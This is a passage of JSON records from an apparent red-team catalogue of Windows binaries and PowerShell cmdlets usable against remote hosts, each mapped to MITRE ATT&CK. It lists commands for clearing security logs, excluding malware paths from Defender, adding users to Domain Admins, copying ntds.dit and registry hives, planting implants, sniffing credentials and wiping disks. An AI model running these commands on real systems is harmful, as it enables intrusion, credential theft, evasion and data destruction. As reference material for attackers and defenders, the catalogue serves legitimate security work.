"Type":"Binaries","Name":"systeminfo.exe","Description":"Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties","Updated":"2023-08-25","Toolsets":["Builtin"],"Commands":[{"Command":"systeminfo.exe /S W10.ad.bitsadmin.com","Description":"Show system information","Usecases":["List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities"],"Function":"Recon","Comments":null,"MitreAttack":["T1082"]}],"Resources":["https://blog.bitsadmin.com/windows-security-updates-for-hackers"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/systeminfo/"},{
"Type":"Binaries","Name":"takeown.exe","Description":"Allows an administrator to recover access to a file that was denied by re-assigning file ownership","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"takeown.exe /S system /F MyShare\\Acme*.doc","Description":"Take ownership over a file","Usecases":["Alter permissions"],"Function":"Data","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/takeown/"},{
"Type":"Binaries","Name":"taskkill.exe","Description":"Terminate tasks by process id (PID) or image name","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"taskkill.exe /S W10.ad.bitsadmin.com /F /IM cmd.exe","Description":"Kill a process","Usecases":["Terminate a process"],"Function":"Processes","Comments":null,"MitreAttack":["T1562.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/taskkill/"},{
"Type":"Binaries","Name":"tasklist.exe","Description":"Displays a list of currently running processes","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"tasklist.exe /S W10.ad.bitsadmin.com /FO CSV > W10_tasklist.csv","Description":"List processes","Usecases":["Perform reconnaissance on executing processes"],"Function":"Processes","Comments":null,"MitreAttack":["T1057"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/tasklist/"},{
"Type":"Binaries","Name":"tsdiscon.exe","Description":"Disconnects a session from a Remote Desktop Session Host (RD Session Host) server","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"tsdiscon.exe rdp-tcp#1 /server:W10.ad.bitsadmin.com","Description":"Disconnect a user","Usecases":null,"Function":"Sessions","Comments":null,"MitreAttack":["T1531"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/tsdiscon/"},{
"Type":"Binaries","Name":"tskill.exe","Description":"Ends a process","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"tskill.exe cmd /Server:W10.ad.bitsadmin.com /A /V","Description":"Kill a process","Usecases":["Terminate a process"],"Function":"Processes","Comments":null,"MitreAttack":["T1562.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/tskill/"},{
"Type":"Binaries","Name":"typeperf.exe","Description":"Writes performance data to the command window or to a log file","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"typeperf.exe \"\\\\W10.ad.bitsadmin.com\\Processor(0)\\% User Time\"","Description":"TODO","Usecases":null,"Function":"Logs","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/typeperf/"},{
"Type":"Binaries","Name":"uptime.exe","Description":"Display uptime of a system","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"uptime.exe W10.ad.bitsadmin.com","Description":"Show uptime","Usecases":["Identify if a machine could be relevant for longer term persistence without having to install persistence"],"Function":"Recon","Comments":null,"MitreAttack":["T1082"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/uptime/"},{
"Type":"Binaries","Name":"volrest.exe","Description":"Previous Version command-line tool","Updated":"2023-08-25","Toolsets":["Extra"],"Commands":[{"Command":"volrest.exe \\\\W10.ad.bitsadmin.com\\C$\\Windows\\System32\\Config","Description":"List snapshots of network share","Usecases":["List snapshots of the config directory and then copy the `SAM`/`SECURITY`/`SYSTEM` files from that snapshot"],"Function":"Data","Comments":["Also known as volume shadow copies","Part of the Windows Server 2003 Resource Kit"],"MitreAttack":["T1083","T1003.002"]}],"Resources":["https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/volrest/"},{
"Type":"Binaries","Name":"w32tm.exe","Description":"Synchronize the date and time","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"w32tm.exe /query /computer:W10.ad.bitsadmin.com /status /verbose","Description":"Show time details","Usecases":null,"Function":"Recon","Comments":null,"MitreAttack":["T1124"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/w32tm/"},{
"Type":"Binaries","Name":"waitfor.exe","Description":"Sends or waits for a signal on a system","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"waitfor.exe","Description":"TODO","Usecases":null,"Function":"Misc","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/waitfor/"},{
"Type":"Binaries","Name":"wevtutil.exe","Description":"Windows Events Command Line Utility","Updated":"2024-12-14","Toolsets":["Builtin"],"Commands":[{"Command":"wevtutil /remote:CAROOT1.ad.bitsadmin.com cl Security","Description":"Clear security event log","Usecases":["Cover tracks clearing past events"],"Function":"Recon","Comments":["See also [Clear-EventLog](../../Cmdlets/Clear-Eventlog)"],"MitreAttack":["T1070.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/wevtutil/"},{
"Type":"Binaries","Name":"winrs.exe","Description":"Manage and execute programs remotely","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"winrs.exe -r:W10.ad.bitsadmin.com ipconfig /all","Description":"Execute WinRM command","Usecases":["Perform reconnaissance or launch implant"],"Function":"Execute","Comments":null,"MitreAttack":["T1021.006","T1059.001"]},{"Command":"winrs.exe -r:W10.ad.bitsadmin.com cmd","Description":"Launch interactive shell","Usecases":null,"Function":"Execute","Comments":null,"MitreAttack":["T1021.006"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/winrs/"},{
"Type":"Binaries","Name":"wmic.exe","Description":"Command-line interface for Windows Management Instrumentation (WMI)","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"wmic.exe /node:W10.ad.bitsadmin.com process call create \"beacon.exe\"","Description":"Launch process","Usecases":["Launch implant"],"Function":"Execute","Comments":null,"MitreAttack":["T1047"]},{"Command":"wmic.exe /node:W10.ad.bitsadmin.com /output:processes.csv process list /format:CSV","Description":"Query processes","Usecases":["Reconnaissance on running processes"],"Function":"Processes","Comments":null,"MitreAttack":["T1057","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/wmic/"},{
"Type":"Cmdlets","Name":"Add-ADGroupMember","Description":"Adds one or more members to an Active Directory group","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Add-ADGroupMember 'Domain Admins' -Members Hacker","Description":"Add user to domain group","Usecases":["Add a user to a certain domain group to obtain certain privileges"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-ADGroupMember/"},{
"Type":"Cmdlets","Name":"Add-DnsClientNrptRule","Description":"Adds a rule to the NRPT","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Add-DnsClientNrptRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsClient`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-DnsClientNrptRule/"},{
"Type":"Cmdlets","Name":"Add-EtwTraceProvider","Description":"Adds an ETW trace provider to an ETW Autologger configuration or ETW session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Add-EtwTraceProvider -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `EventTracingManagement`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-EtwTraceProvider/"},{
"Type":"Cmdlets","Name":"Add-MpPreference","Description":"Modifies settings for Windows Defender","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Add-MpPreference -ExclusionPath 'C:\\EvilTools' -CimSession $s","Description":"Exclude path from AV","Usecases":["Exclude path from AV so malicious tools can be stored there"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-MpPreference/"},{
"Type":"Cmdlets","Name":"Add-NetEventPacketCaptureProvider","Description":"Adds a Remote Packet Capture provider","Updated":"2023-11-04","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)","Description":"Add packet capture provider to eventsession","Usecases":["Sniff authentication traffic on a domain controller and locally crack the hashes"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See all details in [New-NetEventSession](../New-NetEventSession)","Can be opened using for example NetworkMiner or Wireshark","PowerShell Module: `NetEventPacketCapture`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-NetEventPacketCaptureProvider/"},{
"Type":"Cmdlets","Name":"Add-NetNatExternalAddress","Description":"Adds an external address to a NAT instance","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Add-NetNatExternalAddress -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-NetNatExternalAddress/"},{
"Type":"Cmdlets","Name":"Add-NetNatStaticMapping","Description":"Adds a static mapping to a NAT instance","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Add-NetNatStaticMapping -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Add-NetNatStaticMapping/"},{
"Type":"Cmdlets","Name":"Backup-GPO","Description":"Backs up one GPO or all the GPOs in a domain","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Backup-Gpo -Domain ad.bitsadmin.com -All -Path C:\\tmp\\GPOBackups","Description":"Backup all GPOs of the domain","Usecases":["Collect GPOs and search for credentials"],"Function":"Domain","Comments":["PowerShell Module: `GroupPolicy`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Backup-GPO/"},{
"Type":"Cmdlets","Name":"Clear-Disk","Description":"Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Clear-Disk -CimSession $s -Number 3","Description":"Clear disk with id 3","Usecases":["Affect availability of data on a disk"],"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1561","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Clear-Disk/"},{
"Type":"Cmdlets","Name":"Clear-DnsClientCache","Description":"Clears the contents of the DNS client cache","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Clear-DnsClientCache -CimSession $s","Description":"Clear DNS cache","Usecases":["Clear the DNS cache from any DNS entries that the attacker might have (accidentally) placed there"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `DnsClient`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Clear-DnsClientCache/"},{
"Type":"Cmdlets","Name":"Clear-Eventlog","Description":"Clears all entries from specified event logs on the local or remote computers.","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"Clear-EventLog -LogName Application,Security,System -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com","Description":"Clear various logs on various computers","Usecases":["Cover tracks clearing past events in the various logs"],"Function":"Logs","Comments":["Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)","See also [wevtutil.exe](../../Binaries/wevtutil)"],"MitreAttack":["T1070.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Clear-Eventlog/"},{
"Type":"Cmdlets","Name":"Close-SmbOpenFile","Description":"Closes a file that is open by one of the clients of the SMB server","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Close-SmbOpenFile -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Close-SmbOpenFile/"},{
"Type":"Cmdlets","Name":"Close-SmbSession","Description":"Ends forcibly the SMB session","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Close-SmbSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Close-SmbSession/"},{
"Type":"Cmdlets","Name":"Connect-WSMan","Description":"Connects to the WinRM service on a remote computer","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"Connect-WSMan","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `Microsoft.WSMan.Management`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Connect-WSMan/"},{
"Type":"Cmdlets","Name":"Copy-Item","Description":"Copies an item from one location to another","Updated":"2023-08-25","Toolsets":["Builtin","PSSession"],"Commands":[{"Command":"Copy-Item -Path C:\\boot.ini -Destination . -FromSession $ps","Description":"Copy file from PSSession","Usecases":["Exfiltrate data"],"Function":"Data","Comments":["Create PSSession `$ps` using [New-PSSession](../New-PSSession/)","PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1021.006"]},{"Command":"Copy-Item -Path C:\\beacon.exe -Destination C:\\Windows\\System32\\Explorer.exe -ToSession $ps","Description":"Copy file to PSSession","Usecases":["Copy implant"],"Function":"Data","Comments":["Create PSSession `$ps` using [New-PSSession](../New-PSSession/)","PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1021.006","T1570"]},{"Command":"Copy-Item -Path \\\\DC01.ad.bitsadmin.com\\C$\\@GMT-2023.06.01-19.34.01\\Windows\\NTDS\\ntds.dit -Destination C:\\Tmp\\","Description":"Copy from volume shadow copy","Usecases":["Exfiltrate `ntds.dit` from shadow copy over SMB"],"Function":"Data","Comments":["Create PSSession `$ps` using [New-PSSession](../New-PSSession/)","Example of performing such copy at the blog in the references","PowerShell Module: `Microsoft.PowerShell.Management`"],"MitreAttack":["T1570","T1021.002"]}],"Resources":["https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Copy-Item/"},{
"Type":"Cmdlets","Name":"Copy-VMFile","Description":"Copies a file to a virtual machine","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Copy-VMFile -SourcePath C:\\tmp\\malware.exe -Name 'Windows 10 22H2' -DestinationPath C:\\Windows\\System32\\spoolsv64.exe -FileSource Host -CimSession $s","Description":"Copy file to VM","Usecases":["Copy implant to VM"],"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","`C:\\tmp\\malware.exe` is a file path on the Hyper-V host to which the `-CimSession $s` points","`malware.exe` can be copied to the Hyper-V host using [Copy-Item](../Copy-Item)","Depends on some guest integration services to be enabled for the VM","PowerShell Module: `Hyper-V`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Copy-VMFile/"},{
"Type":"Cmdlets","Name":"Disable-ADAccount","Description":"Disables an Active Directory account","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Disable-ADAccount -Identity Hacker","Description":"Disable account","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":["T1531"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Disable-ADAccount/"},{
"Type":"Cmdlets","Name":"Disable-NetAdapter","Description":"Disables a network adapter","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Disable-NetAdapter -Name Ethernet0 -CimSession $s","Description":"Disable network adapter","Usecases":["Put remote machine offline"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetAdapter`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Disable-NetAdapter/"},{
"Type":"Cmdlets","Name":"Disable-NetFirewallRule","Description":"Disables a firewall rule","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Disable-NetFirewallRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Disable-NetFirewallRule/"},{
"Type":"Cmdlets","Name":"Dismount-DiskImage","Description":"Dismounts a disk image (virtual hard disk or ISO) so that it can no longer be accessed as a disk","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Dismount-DiskImage -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Dismount-DiskImage/"},{
"Type":"Cmdlets","Name":"Enable-ADAccount","Description":"Enables an Active Directory account","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Enable-ADAccount","Description":"Enable account","Usecases":["(Re-)enable account to make use of it"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Enable-ADAccount/"},{
"Type":"Cmdlets","Name":"Enable-NetFirewallRule","Description":"Enables a previously disabled firewall rule","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Enable-NetFirewallRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Enable-NetFirewallRule/"},{
"Type":"Cmdlets","Name":"Enter-PSSession","Description":"Starts an interactive session with a remote computer","Updated":"2023-08-25","Toolsets":["Builtin","PSSession"],"Commands":[{"Command":"Enter-PSSession -Session $ps","Description":"Start interactive session","Usecases":["Launch shell and perform reconnaissance or install a backdoor"],"Function":"Execute","Comments":["Create `$ps` using [New-PSSession](../New-PSSession)"],"MitreAttack":["T1021.006"]},{"Command":"Enter-PSSession -ComputerName W10.ad.bitsadmin.com","Description":"Start interactive session","Usecases":["Launch shell and perform reconnaissance or install a backdoor"],"Function":"Execute","Comments":null,"MitreAttack":["T1021.006"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Enter-PSSession/"},{
"Type":"Cmdlets","Name":"Export-VM","Description":"Exports a virtual machine to disk","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Export-VM -Name 'Windows 10 22H2' -Path C:\\tmp -CimSession $s","Description":"Export VM","Usecases":["Export a (running) VM and copy its data over the network"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Can also be a running VM","Next, using [Copy-Item](../Copy-Item) the exported VM can be copied","PowerShell Module: `Hyper-V`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Export-VM/"},{
"Type":"Cmdlets","Name":"Export-VMSnapshot","Description":"Exports a virtual machine checkpoint to disk","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Export-VMSnapshot -Name 'VM snapshot' -VMName 'Windows 10 22H2' -Path C:\\tmp -CimSession $s","Description":"Create snapshot of VM","Usecases":["Create a snapshot to then exfiltrate it over the network"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","Next, using [Copy-Item](../Copy-Item) the snapshot can be copied locally","PowerShell Module: `Hyper-V`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Export-VMSnapshot/"},{
"Type":"Cmdlets","Name":"Find-NetRoute","Description":"Finds the best local IP address and the best route to reach a remote address","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Find-NetRoute -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Find-NetRoute/"},{
"Type":"Cmdlets","Name":"Format-Volume","Description":"Formats one or more existing volumes or a new volume on an existing partition","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Format-Volume -CimSession $s -DriveLetter D -Force","Description":"Format volume","Usecases":["Affect availability of data on a volume"],"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1485","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Format-Volume/"},{
"Type":"Cmdlets","Name":"Get-ADComputer","Description":"Gets one or more Active Directory computers","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADComputer -SearchBase \"OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com\" -Filter *","Description":"Query computers from specific OU","Usecases":["Query list of domain controllers"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null},{"Command":"Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2008*\"' -Properties OperatingSystem","Description":"Query computers with specific attribute","Usecases":["Identify computers running an unsupported operating system"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADComputer/"},{
"Type":"Cmdlets","Name":"Get-ADComputerServiceAccount","Description":"Gets the service accounts hosted by a computer","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Get-ADComputerServiceAccount","Description":"TODO","Usecases":null,"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADComputerServiceAccount/"},{
"Type":"Cmdlets","Name":"Get-ADDomain","Description":"Gets an Active Directory domain","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADDomain ad.bitsadmin.com","Description":"Get domain","Usecases":["Get information about the domain"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADDomain/"},{
"Type":"Cmdlets","Name":"Get-ADDomainController","Description":"Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by providing a domain controller identifier, such as the NetBIOS name","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADDomainController -Filter * -Server ad.bitsadmin.com","Description":"List all domain controllers","Usecases":["Enumerate all domain controllers of a domain"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null},{"Command":"Get-ADDomainController -Discover -Service GlobalCatalog -DomainName ad.bitsadmin.com","Description":"List domain controllers","Usecases":["Obtain hostname and IP of a GC domain controller"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADDomainController/"},{
"Type":"Cmdlets","Name":"Get-ADForest","Description":"Gets an Active Directory forest","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"Get-ADForest -Server ad.bitsadmin.com","Description":"Get forest","Usecases":["Enumerate information about forest"],"Function":"Domain","Comments":["PowerShell Module: `ActiveDirectory`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ADForest/"},{
